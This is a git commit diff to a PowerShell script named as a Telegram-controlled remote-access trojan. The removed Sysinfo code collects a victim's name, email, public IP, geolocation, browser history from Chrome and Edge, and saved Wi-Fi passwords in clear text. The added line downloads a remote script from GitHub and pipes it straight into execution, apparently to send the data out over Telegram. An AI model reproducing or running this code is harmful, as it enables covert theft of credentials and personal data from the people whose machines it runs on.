7e4c2296759418e85e38fbd4b410ceec87965991
beigeworm <93350544+beigeworm@users.noreply.github.com>
2023-07-23 09:48:16 +0000

    Update TG-RAT-Func.ps1

--- Scripts/TG-RAT-Func.ps1
+++ Scripts/TG-RAT-Func.ps1
@@ -437,78 +437,14 @@ Write-Output "$Value2"
 
 
 Function Sysinfo {
-$token="$tg"
+$Token = "$tg"
 $ChatID = "$cid"
-
-$fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full")
-$email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
-$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
-$computerIP = get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}
-$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()
-$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
-$computerSystem = Get-CimInstance CIM_ComputerSystem
-$computerBIOS = Get-CimInstance CIM_BIOSElement
-$computerOs=Get-WmiObject win32_operatingsystem | select Caption, CSName, Version, @{Name="InstallDate";Expression={([WMI]'').ConvertToDateTime($_.InstallDate)}} , @{Name="LastBootUpTime";Expression={([WMI]'').ConvertToDateTime($_.LastBootUpTime)}}, @{Name="LocalDateTime";Expression={([WMI]'').ConvertToDateTime($_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory  | Format-List
-$computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List
-$computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List
-$computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
-$computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table
-$videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution
-$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, FileSystem,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,FileSystem,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; }
-$systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
-$userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
-
-Add-Type -AssemblyName System.Device;$Geolocate = New-Object System.Device.Location.GeoCoordinateWatcher;$Geolocate.Start()
-while (($Geolocate.Status -ne 'Ready') -and ($Geolocate.Permission -ne 'Denied')) {Start-Sleep -Milliseconds 100}  
-$Geolocate.Position.Location | Select Latitude,Longitude
-
-$outssid="";$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){
-if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()}
-$pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim();$outssid+="SSID: $ssid : Password: $pass`n"}}}$a++;}
-
-$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
-$Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
-$Value | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
-
-$Regex2 = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Pathed = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
-$Value2 = Get-Content -Path $Pathed | Select-String -AllMatches $regex2 |% {($_.Matches).Value} |Sort -Unique
-$Value2 | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
-
-$outpath = "$env:temp\systeminfo.txt"
-"USER INFO `n ======================================================" | Out-File -FilePath $outpath -Encoding ASCII
-"Full Name          : $fullName" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Email Address      : $email" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Location           : $Geolocate" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Computer Name      : $env:COMPUTERNAME" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Language           : $systemLanguage" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Keyboard Layout    : $keyboardLayoutID" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"NETWORK INFO `n ===================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Public IP          : $computerPubIP`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Saved Networks     : `n$outssid" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"HARDWARE INFO `n ==================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"computer           : $computerSystem" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"BIOS Info          : $computerBIOS" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"RAM Info           : $computerRamCapacity" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($computerRam| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"OS Info            `n ---------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($computerOs| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"CPU Info           `n ---------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($computerCpu| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Graphics Info      `n ---------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($videocard| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"HDD Info           `n ---------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($Hdds| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-
-$Pathsys = "$env:temp\systeminfo.txt"
-$msgsys = Get-Content -Path $Pathsys -Raw
-Write-Output "$msgsys"
+irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/Sys-Info-to-TG.ps1 | iex
+Write-Output "Done."
 }
 
 Function Send-DadJoke 
 {
-Write-Output "Sending dad joke..."
-
     Add-Type -AssemblyName System.speech
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
